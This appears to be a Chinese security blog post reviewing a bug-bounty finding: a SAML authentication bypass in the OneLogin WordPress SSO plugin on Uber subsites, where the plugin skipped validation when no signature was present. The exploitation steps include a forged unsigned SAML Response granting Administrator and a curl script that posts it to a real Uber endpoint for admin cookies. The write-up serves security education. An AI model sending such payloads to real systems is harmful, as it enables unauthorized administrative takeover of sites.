#  SAML认证绕过：Uber的一万美元漏洞复盘学习  
原创 Zacarx
                    Zacarx  Zacarx随笔   2026-02-03 08:15  
  
## 案例背景  
- **目标**  
：Uber旗下多个WordPress子站（eng.uber.com、newsroom.uber.com等）  
  
- **漏洞类型**  
：SAML SSO认证绕过  
  
- **赏金**  
：$10,000  
  
- **发现者**  
：Jouko Pynnönen  
  
- **报告编号**  
：HackerOne [#136169]()  
  
  
Uber在多个子域名上部署了WordPress站点，用于工程博客、新闻发布等用途。为了方便员工登录，这些站点集成了OneLogin SAML SSO插件，员工可以通过公司统一身份认证系统登录，而不需要单独记住每个站点的密码。  
## 背景知识：  
### 什么是单点登录(SSO)  
  
**SSO（Single Sign-On，单点登录）**  
解决的是这个问题：  
  
一家公司有很多内部系统（邮箱、OA、Wiki、代码仓库...），员工不想每个系统都记一套账号密码。  
  
SSO的方案是：**登录一次，到处通行**  
。  
  
员工只需要在一个统一的地方登录一次，就能访问所有接入的系统。  
  
你很可能已经用过类似的东西：  
- 用微信登录其他App  
  
- 用Google账号登录第三方网站  
  
- 公司内网登录一次就能访问所有内部系统  
  
### 什么是SAML  
  
**SAML（Security Assertion Markup Language，安全断言标记语言）**  
是实现SSO的一种协议，主要用于企业环境。  
  
简单理解：SAML就是一套"规矩"，规定了"怎么证明你是你"这件事应该怎么做、数据格式是什么样的。  
  
它基于XML格式，虽然看起来有点老派，但在企业级应用中非常普遍，很多大公司的内部系统都用SAML做身份认证。  
### 三个角色：用户、SP、IdP  
  
SAML登录涉及三方：  
<table><thead><tr><th style="font-size: 10px;padding: 9px 12px;line-height: 22px;color: rgb(8, 155, 163);border: 1px solid rgb(8, 155, 163);vertical-align: top;font-weight: bold;background-color: rgba(122, 234, 240, 0.094);"><section><span leaf="">角色</span></section></th><th style="font-size: 10px;padding: 9px 12px;line-height: 22px;color: rgb(8, 155, 163);border: 1px solid rgb(8, 155, 163);vertical-align: top;font-weight: bold;background-color: rgba(122, 234, 240, 0.094);"><section><span leaf="">全称</span></section></th><th style="font-size: 10px;padding: 9px 12px;line-height: 22px;color: rgb(8, 155, 163);border: 1px solid rgb(8, 155, 163);vertical-align: top;font-weight: bold;background-color: rgba(122, 234, 240, 0.094);"><section><span leaf="">是什么</span></section></th><th style="font-size: 10px;padding: 9px 12px;line-height: 22px;color: rgb(8, 155, 163);border: 1px solid rgb(8, 155, 163);vertical-align: top;font-weight: bold;background-color: rgba(122, 234, 240, 0.094);"><section><span leaf="">例子</span></section></th></tr></thead><tbody><tr><td style="font-size: 10px;padding: 9px 12px;line-height: 22px;color: rgb(34, 34, 34);border: 1px solid rgb(8, 155, 163);vertical-align: top;"><strong style="color: rgb(0, 0, 0);font-weight: bold;"><span leaf="">用户</span></strong></td><td style="font-size: 10px;padding: 9px 12px;line-height: 22px;color: rgb(34, 34, 34);border: 1px solid rgb(8, 155, 163);vertical-align: top;"><section><span leaf="">User</span></section></td><td style="font-size: 10px;padding: 9px 12px;line-height: 22px;color: rgb(34, 34, 34);border: 1px solid rgb(8, 155, 163);vertical-align: top;"><section><span leaf="">要登录的人</span></section></td><td style="font-size: 10px;padding: 9px 12px;line-height: 22px;color: rgb(34, 34, 34);border: 1px solid rgb(8, 155, 163);vertical-align: top;"><section><span leaf="">你</span></section></td></tr><tr><td style="font-size: 10px;padding: 9px 12px;line-height: 22px;color: rgb(34, 34, 34);border: 1px solid rgb(8, 155, 163);vertical-align: top;"><strong style="color: rgb(0, 0, 0);font-weight: bold;"><span leaf="">SP</span></strong></td><td style="font-size: 10px;padding: 9px 12px;line-height: 22px;color: rgb(34, 34, 34);border: 1px solid rgb(8, 155, 163);vertical-align: top;"><section><span leaf="">Service Provider（服务提供商）</span></section></td><td style="font-size: 10px;padding: 9px 12px;line-height: 22px;color: rgb(34, 34, 34);border: 1px solid rgb(8, 155, 163);vertical-align: top;"><section><span leaf="">你想访问的应用</span></section></td><td style="font-size: 10px;padding: 9px 12px;line-height: 22px;color: rgb(34, 34, 34);border: 1px solid rgb(8, 155, 163);vertical-align: top;"><section><span leaf="">WordPress博客、Jira、Confluence</span></section></td></tr><tr><td style="font-size: 10px;padding: 9px 12px;line-height: 22px;color: rgb(34, 34, 34);border: 1px solid rgb(8, 155, 163);vertical-align: top;"><strong style="color: rgb(0, 0, 0);font-weight: bold;"><span leaf="">IdP</span></strong></td><td style="font-size: 10px;padding: 9px 12px;line-height: 22px;color: rgb(34, 34, 34);border: 1px solid rgb(8, 155, 163);vertical-align: top;"><section><span leaf="">Identity Provider（身份提供商）</span></section></td><td style="font-size: 10px;padding: 9px 12px;line-height: 22px;color: rgb(34, 34, 34);border: 1px solid rgb(8, 155, 163);vertical-align: top;"><section><span leaf="">负责验证身份的系统</span></section></td><td style="font-size: 10px;padding: 9px 12px;line-height: 22px;color: rgb(34, 34, 34);border: 1px solid rgb(8, 155, 163);vertical-align: top;"><section><span leaf="">OneLogin、Okta、Azure AD、企业自建的统一认证系统</span></section></td></tr></tbody></table>  
打个比方：  
- 你要进一栋大楼（SP）  
  
- 门卫不认识你，让你去物业中心（IdP）开证明  
  
- 物业中心核实你的身份后，给你开了一张带公章的证明信  
  
- 你拿着证明信回来，门卫验证公章是真的，就放你进去了  
  
### SAML登录的完整流程  
  
![image-20260203160509530](https://mmbiz.qpic.cn/sz_mmbiz_png/XLoEenAE7ARPKSAWwUmFp7c2kuVWNNLtnGu5AjEvD7a8RczFVZBwXqhFrVZjyLUxHZInibz67MkQ1M8SUQ9xibmQ/640?wx_fmt=png&from=appmsg "image-20260203160509530")  
### 安全机制的核心：数字签名  
  
整个流程的安全性依赖于**第⑦步的签名验证**  
。  
  
SAML Response里会包含一个数字签名，原理类似于：  
- IdP有一把"私钥"（只有IdP自己知道）  
  
- IdP用私钥对Response内容进行签名  
  
- SP有IdP的"公钥"（公开的）  
  
- SP用公钥验证签名是否有效  
  
这就像公章一样：  
- 只有物业中心有真公章（私钥）  
  
- 门卫知道真公章长什么样（公钥）  
  
- 门卫通过验证公章来确认证明信是真的  
  
**如果没有签名验证会怎样？**  
任何人都可以伪造一张"证明信"，声称自己是管理员，门卫无法分辨真假。  
## 漏洞原理  
### 问题出在哪  
  
研究员发现OneLogin SAML SSO插件的签名验证逻辑存在致命缺陷。来看关键代码：  
```
// 文件：Response.php - isValid() 函数// 查找Response中的签名元素$signedElements = $this->getSignedElements();// 问题在这里：只有当签名元素存在时才验证if (!empty($signedElements)) {    // 执行签名验证逻辑    $this->validateSignature();}// 如果$signedElements为空，直接跳过验证！
```  
### 为什么这是错误的  
  
正确的逻辑应该是：  
```
如果没有签名 → 拒绝请求如果有签名但无效 → 拒绝请求如果有签名且有效 → 允许登录
```  
  
实际的逻辑变成了：  
```
如果没有签名 → 跳过验证 → 允许登录 ❌如果有签名但无效 → 拒绝请求如果有签名且有效 → 允许登录
```  
  
**本质问题**  
：把"签名验证"做成了可选项，而不是强制项。攻击者只需要构造一个不包含<ds:Signature>  
标签的SAML Response，就能完全绕过认证。  
## 利用过程  
### Step 1: 确认目标使用SAML SSO  
  
访问目标WordPress站点的登录页面，观察是否有SSO登录选项，或者直接访问插件的ACS端点：  
```
https://newsroom.uber.com/wp-content/plugins/onelogin-saml-sso/onelogin_saml.php?acs
```  
  
如果返回错误信息而不是404，说明插件已安装。  
### Step 2: 构造伪造的SAML Response  
  
创建一个XML文件，包含想要伪造的用户信息，**关键是不包含任何签名标签**  
：  
```
<?xml version="1.0" encoding="UTF-8"?><samlp:Response xmlns:samlp="urn:oasis:names:tc:SAML:2.0:protocol"                xmlns:saml="urn:oasis:names:tc:SAML:2.0:assertion"                ID="_response_id_12345"                Version="2.0"                IssueInstant="2024-01-01T00:00:00Z"                Destination="https://newsroom.uber.com/wp-content/plugins/onelogin-saml-sso/onelogin_saml.php?acs">        <saml:Issuer>https://app.onelogin.com/saml/metadata/123456</saml:Issuer>        <!-- 注意：这里故意不包含 <ds:Signature> 标签 -->        <samlp:Status>        <samlp:StatusCode Value="urn:oasis:names:tc:SAML:2.0:status:Success"/>    </samlp:Status>        <saml:Assertion Version="2.0" ID="_assertion_id_67890">        <saml:Issuer>https://app.onelogin.com/saml/metadata/123456</saml:Issuer>                <saml:Subject>            <saml:NameID Format="urn:oasis:names:tc:SAML:1.1:nameid-format:emailAddress">                admin@uber.com            </saml:NameID>        </saml:Subject>                <saml:Conditions NotBefore="2024-01-01T00:00:00Z"                          NotOnOrAfter="2099-12-31T23:59:59Z">        </saml:Conditions>                <!-- 伪造的用户属性 -->        <saml:AttributeStatement>            <!-- 用户名：指定为admin -->            <saml:Attribute Name="User.Username">                <saml:AttributeValue>admin</saml:AttributeValue>            </saml:Attribute>                        <!-- 邮箱 -->            <saml:Attribute Name="User.email">                <saml:AttributeValue>admin@uber.com</saml:AttributeValue>            </saml:Attribute>                        <!-- 角色：指定为Administrator -->            <saml:Attribute Name="memberOf">                <saml:AttributeValue>Administrator</saml:AttributeValue>            </saml:Attribute>        </saml:AttributeStatement>    </saml:Assertion></samlp:Response>
```  
### Step 3: 编码并发送请求  
  
SAML Response需要Base64编码后通过POST发送：  
```
#!/bin/bash# 将XML文件Base64编码SAML_RESPONSE=$(base64 -w 0 response.xml)# 发送POST请求到ACS端点curl -v 'https://newsroom.uber.com/wp-content/plugins/onelogin-saml-sso/onelogin_saml.php?acs' \    -H 'Content-Type: application/x-www-form-urlencoded' \    -d "RelayState=/wp-admin/" \    --data-urlencode "SAMLResponse=${SAML_RESPONSE}" \    -c cookies.txt  # 保存返回的Cookie# 使用获取的Cookie访问后台curl -b cookies.txt 'https://newsroom.uber.com/wp-admin/'
```  
### Step 4: 验证结果  
  
如果利用成功，服务器会：  
1. 返回有效的WordPress认证Cookie  
  
1. 如果用户不存在且开启了自动配置(provisioning)，会自动创建该用户  
  
1. 用户角色按照SAML Response中指定的memberOf  
属性设置  
  
研究员成功获取了管理员权限，可以：  
- 访问WordPress后台  
  
- 发布/修改/删除文章  
  
- 安装插件（可能进一步RCE）  
  
- 管理其他用户  
  
## 漏洞影响  
  
**危害等级**  
：严重 (Critical)  
### 具体危害  
1. **任意账户伪造**  
：攻击者可以伪造任意用户身份登录，包括管理员  
  
1. **零交互攻击**  
：不需要受害者点击任何链接，纯服务端攻击  
  
1. **隐蔽性强**  
：  
  
1. 不会触发密码错误告警  
  
1. 不需要钓鱼获取凭据  
  
1. 日志中看起来像正常的SSO登录  
  
1. **权限提升**  
：直接获取最高权限，无需逐步提权  
  
1. **横向影响**  
：Uber多个子站使用相同插件，一个PoC通杀  
  
### 影响范围  
- eng.uber.com  
  
- newsroom.uber.com  
  
- 其他使用该插件的WordPress站点  
  
- 理论上所有使用该版本OneLogin SAML插件的站点都受影响  
  
## 案例启示  
### 漏洞本质  
  
这个漏洞的本质是"可选安全机制"——开发者把签名验证实现成了"有就验，没有就跳过"，而不是"必须有且必须对"。  
  
这种模式在安全领域非常危险，类似的例子还有：  
- JWT的alg:none  
绕过（算法字段设为none跳过验证）  
  
- 某些API的签名参数可选（不传sign参数就不验证）  
  
### 可复用的挖洞思路  
1. **测试认证流程的边界情况**  
：不只测试正常流程，要测试缺少某些字段时的行为  
  
1. **关注第三方插件/库**  
：它们往往没有主应用审计严格  
  
1. **XML相关的认证要重点关注**  
：SAML、SOAP等XML协议历史上漏洞很多  
  
### 类似漏洞场景  
- OAuth/OIDC实现中的state参数校验  
  
- JWT库的算法混淆攻击  
  
- API网关的签名验证逻辑  
  
- 支付回调的签名校验  
  
  
  
